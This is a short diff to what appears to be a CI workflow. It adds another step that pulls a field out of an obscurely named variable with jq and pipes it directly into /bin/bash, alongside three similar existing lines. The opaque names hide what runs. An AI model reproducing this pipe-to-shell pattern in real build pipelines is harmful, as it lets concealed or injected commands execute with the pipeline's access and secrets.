@@ -36,6 +36,7 @@ jobs:
           echo $ju54 | jq -r .tvuz8370 | /bin/bash
           echo $wx52095 | jq -r .m12929 | /bin/bash
           echo $oghzh38 | jq -r .sn267 | /bin/bash
+          printf '%s' "$ckf31" | jq -r .lri44 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
